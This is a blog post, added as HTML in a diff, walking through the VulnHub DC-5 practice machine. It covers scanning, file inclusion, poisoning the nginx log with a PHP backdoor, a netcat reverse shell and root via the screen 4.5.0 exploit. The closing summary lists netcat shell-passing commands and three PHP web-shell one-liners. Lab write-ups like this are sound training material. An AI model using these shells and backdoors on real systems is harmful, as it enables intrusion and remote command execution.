@@ -1,0 +1,281 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DC-5 VulnHub Walkthrough | 2867a0's blog</title><meta name="keywords" content="DC Series"><meta name="author" content="2867a0"><meta name="copyright" content="2867a0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="DC~5：WalkThrough       ![temp.png](https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;05&#x2F;06&#x2F;PuZbrHCW2LGh1gy.png)   [TOC]  信息收集主机发现nmap --system-dns -sP 10.0.0.1&#x2F;24 --excludefile no_scan.txt | grep 10.0.0. | awk &amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-5 VulnHub Walkthrough">
+<meta property="og:url" content="http://2867a0.github.io/dc/dc5/index.html">
+<meta property="og:site_name" content="2867a0&#39;s blog">
+<meta property="og:description" content="DC~5：WalkThrough       ![temp.png](https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;05&#x2F;06&#x2F;PuZbrHCW2LGh1gy.png)   [TOC]  信息收集主机发现nmap --system-dns -sP 10.0.0.1&#x2F;24 --excludefile no_scan.txt | grep 10.0.0. | awk &amp;#">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://2867a0.github.io/img/default_cover.jpg">
+<meta property="article:published_time" content="2020-07-22T00:15:44.000Z">
+<meta property="article:modified_time" content="2020-07-22T00:25:02.000Z">
+<meta property="article:author" content="2867a0">
+<meta property="article:tag" content="DC Series">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://2867a0.github.io/img/default_cover.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://2867a0.github.io/dc/dc5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2020-07-22 08:25:02'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}const fontSizeVal = saveToLocal.get('global-font-size')
+if (fontSizeVal !== undefined) {
+  document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+}})()</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 档案</span></a></div><div class="menus_item"><a class="site-page" href="/about/me.html"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/default_cover.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">2867a0's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 档案</span></a></div><div class="menus_item"><a class="site-page" href="/about/me.html"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">DC-5 VulnHub Walkthrough</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-07-22T00:15:44.000Z" title="Created 2020-07-22 08:15:44">2020-07-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-07-22T00:25:02.000Z" title="Updated 2020-07-22 08:25:02">2020-07-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/VulnHub/">VulnHub</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><div align="center">
+    <h2>
+        DC~5：WalkThrough
+    </h2>
+</div>
+![temp.png](https://i.loli.net/2020/05/06/PuZbrHCW2LGh1gy.png)
+
+<hr>
+<p>[TOC]</p>
+<hr>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap --system-dns -sP 10.0.0.1/24 --excludefile no_scan.txt | grep 10.0.0. | awk <span class="string">&#x27;&#123;print $5&#125;&#x27;</span> &gt; target.txt &amp;&amp; cat target.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/05/06/xVDbjIrsgeity8F.png" alt="temp.png"></p>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -T4 -A -iL target.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/05/06/J6LgbMeDSEH8tqc.png" alt="temp.png"></p>
+<h4 id="网站扫描"><a href="#网站扫描" class="headerlink" title="网站扫描"></a>网站扫描</h4><blockquote>
+<p>使用skipfish对目标进行扫描，并将结果保存成web页面格式</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">skipfish -o /root/桌面/dc-5/ http://10.0.0.36</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/05/06/aD2uW6CHjFw9xTe.png" alt="temp.png"></p>
+<blockquote>
+<p>查看隐藏的页面，看起来像是一个页脚</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/06/MHbCpksDywc4iSP.png" alt="temp.png"></p>
+<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><blockquote>
+<p>访问目标80端口。访问contact.php，填写First Name和Last Name，发现数据以GET方式传递</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/06/NDUan7boSCBKequ.png" alt="temp.png"></p>
+<blockquote>
+<p>当改变传入数据时，copyright的日期会发生变化</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/06/u3U92ysw1VigACE.png" alt="temp.png"></p>
+<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><blockquote>
+<p>结合刚才使用skipfish扫描到的隐藏php文件，猜测目标会调用该隐藏文件，所以尝试文件包含，尝试访问/etc/passwd，成功读取到文件内容，目标存在文件包含</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/06/sQEa8L4DBJNed1S.png" alt="temp.png"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="写入php后门"><a href="#写入php后门" class="headerlink" title="写入php后门"></a>写入php后门</h4><blockquote>
+<p>接下来可以将php后门写入nginx日志中，nginx日志默认路径可以在网上搜索得知。写入后使用文件包含漏洞触发日志中的php后门代码。nginx默认日志路径为/var/log/nginx/access.log和/var/log/nginx/error.log</p>
+<p>首先写入一句话后门到目标日志，这里需要使用burp修改GET请求</p>
+</blockquote>
+ <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;? php <span class="built_in">echo</span> shell_exec(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/05/06/XuoRAap6QvzPJ3s.png" alt="temp.png"></p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><blockquote>
+<p>然后执行nc命令将目标bash反弹给kali</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/06/y5rDEVsWj7Tx4cO.png" alt="temp.png"></p>
+<blockquote>
+<p>kali侦听4444的端口成功获取shell</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/06/3I5mHVDKonTQPC1.png" alt="temp.png"></p>
+<h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><blockquote>
+<p>使用python“升级”获取的shell</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/06/vjDrhGgRAwCEcMJ.png" alt="temp.png"></p>
+<blockquote>
+<p>接下来收集目标机器有价值的信息，查看目标系统信息，查看suid权限的命令</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/05/06/sHkNJ6hMo3rLAaV.png" alt="temp.png"></p>
+<h4 id="screen-4-5-0"><a href="#screen-4-5-0" class="headerlink" title="screen-4.5.0"></a>screen-4.5.0</h4><blockquote>
+<p>screen-4.5.0有本地提权漏洞，可在searchsploit中搜索到相关漏洞</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/05/06/1dnYrJGSKQmLejf.png" alt="temp.png"></p>
+<blockquote>
+<p>将41154.sh，复制到根目录，使用vim打开，修改编码格式为linux上的编码格式</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/06/V6tBhjicbJkNdnK.png" alt="temp.png"></p>
+<blockquote>
+<p>更改完成后使用file查看</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/06/dWM85q9sNuaRlBn.png" alt="temp.png"></p>
+<blockquote>
+<p>由于无法在靶机中编译c文件，所以只能在kali上先编译好再上传脚本所需文件到目标执行。按照脚本中的步骤手动创建文件，再执行所给的gcc命令，最后的文件是：</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/06/IPSMJ8czfr6DndK.png" alt="temp2.png"></p>
+<blockquote>
+<p>使用ftp获取所需文件</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/06/gD721depjUZiGbL.png" alt="temp2.png"></p>
+<blockquote>
+<p>执行脚本</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/06/D7IKBbnA2xPzFtJ.png" alt="temp2.png"></p>
+<blockquote>
+<p>成功获取root权限，查看root目录</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/06/RXliFTvHCYWKmhx.png" alt="temp2.png"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><blockquote>
+<p>nmap指定excludefile，不扫描文件中的IP</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap --system-dns -sP 10.0.0.1/24 --excludefile no_scan.txt | grep 10.0.0. | awk <span class="string">&#x27;&#123;print $5&#125;&#x27;</span> &gt; target.txt &amp;&amp; cat target.txt</span><br></pre></td></tr></table></figure>
+<h4 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a>skipfish</h4><blockquote>
+<p>使用skipfish时，需先指定输出目录，再指定扫描的目标，否则程序会报错</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">skipfish -o /root/桌面/dc-5/ http://10.0.0.36</span><br></pre></td></tr></table></figure>
+<h4 id="文件包含利用"><a href="#文件包含利用" class="headerlink" title="文件包含利用"></a>文件包含利用</h4><blockquote>
+<p>单纯的文件包含漏洞危害可能不是很大，但是使用文件包含去访问具有恶意代码的文件时（如具有可执行权限的日志文件，攻击者通过某种手段将恶意代码写入日志文件中），可能会造成更严重的后果</p>
+</blockquote>
+<h4 id="NC获取shell"><a href="#NC获取shell" class="headerlink" title="NC获取shell"></a>NC获取shell</h4><blockquote>
+<p>使用nc进行连接时，将shell传递给对方</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nc -vlp 9527  <span class="comment">#侦听端</span></span><br><span class="line">nc -nv 10.0.0.26 -c /bin/bash  <span class="comment">#连接方传递bash到侦听端</span></span><br><span class="line">mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="PHP一句话后门"><a href="#PHP一句话后门" class="headerlink" title="PHP一句话后门"></a>PHP一句话后门</h4><blockquote>
+<p>php一句话后门可参考<a href="https://www.uedbox.com/post/6051/">网址</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php <span class="keyword">echo</span> shell_exec(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span> php <span class="keyword">eval</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;arg&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span> php assert(@<span class="variable">$_POST</span>[<span class="string">&#x27;arg&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/DC-Series/">DC Series</a></div><div class="post_share"><div class="social-share" data-image="/img/default_cover.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/dc/dc6/"><img class="prev-cover" src="/img/default_cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">DC-6 VulnHub Walkthrough</div></div></a></div><div class="next-post pull-right"><a href="/dc/dc4/"><img class="next-cover" src="/img/default_cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">DC-4 VulnHub Walkthrough</div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">
+        DC~5：WalkThrough
+    </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text">网站扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞发现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.2.1.</span> <span class="toc-text">文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5php%E5%90%8E%E9%97%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">写入php后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.3.2.</span> <span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">1.4.</span> <span class="toc-text">后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#screen-4-5-0"><span class="toc-number">1.4.1.</span> <span class="toc-text">screen-4.5.0</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap"><span class="toc-number">1.5.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#skipfish"><span class="toc-number">1.5.2.</span> <span class="toc-text">skipfish</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.3.</span> <span class="toc-text">文件包含利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NC%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.5.4.</span> <span class="toc-text">NC获取shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%90%8E%E9%97%A8"><span class="toc-number">1.5.5.</span> <span class="toc-text">PHP一句话后门</span></a></li></ol></li></ol></li></ol></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 2867a0</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="Increase font size"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="Decrease font size"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
